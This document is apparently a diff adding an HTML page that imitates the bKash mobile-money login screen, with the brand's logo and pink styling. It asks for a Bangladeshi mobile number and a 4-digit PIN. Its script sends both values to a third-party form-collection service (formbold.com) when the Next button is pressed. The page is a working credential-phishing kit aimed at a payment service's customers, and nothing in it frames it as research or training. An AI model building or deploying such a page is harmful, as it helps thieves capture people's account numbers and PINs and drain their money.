@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Web Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #fff;
+            /* White background */
+        }
+
+        header {
+            background-color: #fff;
+            /* White background for header */
+            padding: 10px;
+            position: fixed;
+            top: 50px;
+            /* Adjust the top distance to move the logo lower */
+            left: 20px;
+            /* Adjust the left distance */
+        }
+
+        header img {
+            width: 70px;
+            /* Adjust the width of the logo */
+            height: auto;
+            /* Maintain aspect ratio */
+        }
+
+        main {
+            padding: 20px;
+            margin-top: 100px;
+            /* Add margin to create space below the logo */
+        }
+
+        main p {
+            font-size: 25px;
+            /* Set the font size to 25 pixels */
+            color: #888;
+            /* Change the text color */
+        }
+
+        main p.mobile-number {
+            font-size: 18px;
+            /* Set the font size for the country code and mobile number */
+            color: #888;
+            /* Change the text color for the country code and mobile number */
+            display: inline-block;
+            /* Make the elements inline-block to appear next to each other */
+            margin-right: 5px;
+            /* Add some space between the elements */
+        }
+
+        main input[type="text"],
+        main input[type="number"] {
+            font-size: 18px;
+            /* Set the font size for the input boxes */
+            padding: 5px;
+            /* Adjust padding as needed */
+            margin: 5px 0;
+            /* Add margin around the input boxes */
+            border: none;
+            /* Remove the border */
+            background: transparent;
+            /* Make the background transparent */
+            border-bottom: none;
+            /* Remove the bottom border */
+            outline: none;
+            /* Remove the default focus outline */
+        }
+
+        main p.terms-text {
+            font-size: 14px;
+            /* Set the font size for the added text */
+            color: #888;
+            /* Default color for the terms text */
+            margin-top: 5px;
+            /* Add a small margin on top for separation */
+        }
+
+        main p.terms-text a {
+            color: #e2136e;
+            /* Pink color for the link */
+            text-decoration: none;
+            /* Remove underline from the link */
+        }
+
+        main p.terms-text a:hover {
+            text-decoration: underline;
+            /* Underline the link on hover */
+        }
+
+        footer {
+            background-color: #e2136e;
+            /* Pink background for footer */
+            color: #fff;
+            text-align: right;
+            /* Align text to the right */
+            padding: 0 10px;
+            /* Adjusted padding to maintain some space inside the footer */
+            height: 40px;
+            /* Set the fixed height to 40 pixels (increased from 15 pixels) */
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            /* Center content vertically */
+            justify-content: flex-end;
+            /* Align content to the right */
+        }
+
+        footer button {
+            margin-right: 10px;
+            /* Add margin to the right side of the button */
+            background: none;
+            /* No background */
+            color: #fff;
+            /* White text color */
+            font-size: 20px;
+            /* Larger font size */
+            border: none;
+            /* No border */
+            cursor: pointer;
+            /* Add cursor pointer on hover */
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <img src="https://freelogopng.com/images/all_img/1656234841bkash-icon-png.png" alt="Your Logo">
+    </header>
+
+    <main>
+        <!-- Your main content goes here -->
+        <p>Enter mobile number <br>for <b>Login/Register</b></p>
+        <p class="mobile-number">+880</p>
+        <input type="number" placeholder="Your Mobile Number" maxlength="11">
+        <!-- Added the new input box for PIN -->
+        <input type="number" placeholder="Enter PIN" maxlength="4">
+        <p class="terms-text">By proceeding, you agree to the <a href="#" target="_blank">Terms and Conditions</a></p>
+        <!-- Removed the duplicated country code text with box underneath -->
+    </main>
+
+    <footer>
+        <button id="nextButton">Next</button>
+    </footer>
+
+    <script>
+        document.getElementById('nextButton').addEventListener('click', function () {
+            // Get the values from the input fields
+            var mobileNumber = document.querySelector('input[type="number"][placeholder="Your Mobile Number"]').value;
+            var pin = document.querySelector('input[type="number"][placeholder="Enter PIN"]').value;
+
+            // Construct the data to be sent
+            var formData = new FormData();
+            formData.append('Mobile Number', '+880' + mobileNumber); // Concatenate the country code
+            formData.append('PIN', pin);
+
+            // Send the data to the new API endpoint
+            fetch('https://formbold.com/s/6M7VL', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                // You can add further actions here, like displaying a success message to the user
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Handle errors here, such as displaying an error message to the user
+            });
+        });
+    </script>
+
+</body>
+
+</html>
